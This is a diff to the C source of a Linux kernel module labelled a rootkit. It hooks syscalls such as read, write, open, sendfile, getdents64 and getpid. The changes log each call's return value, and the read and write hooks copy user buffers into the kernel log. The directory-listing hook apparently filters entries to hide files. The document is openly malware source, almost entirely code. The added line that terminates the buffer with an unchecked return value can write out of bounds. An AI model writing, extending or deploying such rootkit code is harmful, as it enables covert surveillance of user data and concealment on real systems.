@@ -59,9 +59,10 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
     long l_ret   = 0;
     char *s_data = NULL;
 
-    pr_info("[ROOTKIT] read(%u, %p, %zu)\n", ui32_fd, s_buf, sz_count);
+    pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
     l_ret = orig_read(p_regs);
+    pr_cont(" = %ld\n", l_ret);
 
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
@@ -73,7 +74,8 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         } else {
-            pr_info("[ROOTKIT] * Data read: %.*s\n", (int)sz_count, s_data);
+            s_data[l_ret] = '\0';
+            pr_info("[ROOTKIT] * Data read: %s\n", s_data);
         }
 
         kvfree(s_data);
@@ -87,9 +89,13 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
                       size_t, sz_count)
 {
     long l_err   = 0;
+    long l_ret   = 0;
     char *s_data = NULL;
 
-    pr_info("[ROOTKIT] write(%u, %p, %zu)\n", ui32_fd, s_buf, sz_count);
+    pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
+
+    l_ret = orig_write(p_regs);
+    pr_cont(" = %ld\n", l_ret);
 
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
@@ -101,13 +107,14 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         } else {
-            pr_info("[ROOTKIT] * Data to write: %.*s\n", (int)sz_count, s_data);
+            s_data[l_ret] = '\0';
+            pr_info("[ROOTKIT] * Data to write: %s\n", s_data);
         }
 
         kvfree(s_data);
     }
 
-    return orig_write(p_regs);
+    return l_ret;
 }
 
 // sys_open syscall hook handler
@@ -115,7 +122,10 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
                       umode_t, ui16_mode)
 {
     long l_err         = 0;
+    long l_ret         = 0;
     char *s_filename_k = NULL;
+
+    l_ret = orig_open(p_regs);
 
     s_filename_k = (char *)kvmalloc(PATH_MAX, GFP_KERNEL);
 
@@ -129,12 +139,13 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
             strncpy(s_filename_k, "(unknown)", PATH_MAX);
         }
 
-        pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)\n", s_filename_k, i32_flags, ui16_mode);
+        pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode,
+                l_ret);
 
         kvfree(s_filename_k);
     }
 
-    return orig_open(p_regs);
+    return l_ret;
 }
 
 // sys_pread64 syscall hook handler
@@ -145,9 +156,10 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
     long l_ret   = 0;
     char *s_data = NULL;
 
-    pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)\n", ui32_fd, s_buf, sz_count, i64_pos);
+    pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);
 
     l_ret = orig_pread64(p_regs);
+    pr_cont(" = %ld\n", l_ret);
 
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
@@ -159,7 +171,8 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         } else {
-            pr_info("[ROOTKIT] * Data read: %.*s\n", (int)sz_count, s_data);
+            s_data[l_ret] = '\0';
+            pr_info("[ROOTKIT] * Data read: %s\n", s_data);
         }
 
         kvfree(s_data);
@@ -172,9 +185,14 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
 SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                       loff_t __user *, p_offset, size_t, sz_count)
 {
-    pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)\n", i32_out_fd, i32_in_fd, p_offset, sz_count);
+    long l_ret = 0;
 
-    return orig_sendfile(p_regs);
+    pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);
+
+    l_ret = orig_sendfile(p_regs);
+    pr_cont(" = %ld\n", l_ret);
+
+    return l_ret;
 }
 
 // sys_getdents syscall hook handler
@@ -198,12 +216,14 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     long l_move_len          = 0; // Length of the data to move
     unsigned short us_reclen = 0; // Length of the current directory entry
 
-    struct linux_dirent64 *p_dirent_k    = NULL; // Kernel buffer
+    struct linux_dirent64 *p_dirent_k    = NULL; // Kernel buffer for directory entry array
     struct linux_dirent64 *p_dirent_k_it = NULL; // Directory entry array iterator
 
-    pr_info("[ROOTKIT] getdents64(%u, %p, %u)\n", ui32_fd, p_dirent, ui32_count);
+    pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
 
     l_ret_orig = orig_getdents64(p_regs);
+    pr_cont(" = %ld\n", l_ret_orig);
+
     if (l_ret_orig <= 0) {
         // No entries or error, return immediately
         if (l_ret_orig == 0) {
@@ -280,9 +300,14 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 // sys_getpid syscall hook handler
 SYSCALL_HOOK_HANDLER0(getpid, orig_getpid, p_regs)
 {
-    pr_info("[ROOTKIT] getpid()\n");
+    long l_ret = 0;
 
-    return orig_getpid(p_regs);
+    pr_info("[ROOTKIT] getpid()");
+
+    l_ret = orig_getpid(p_regs);
+    pr_cont(" = %ld\n", l_ret);
+
+    return l_ret;
 }
 
 // sys_kill syscall hook handler
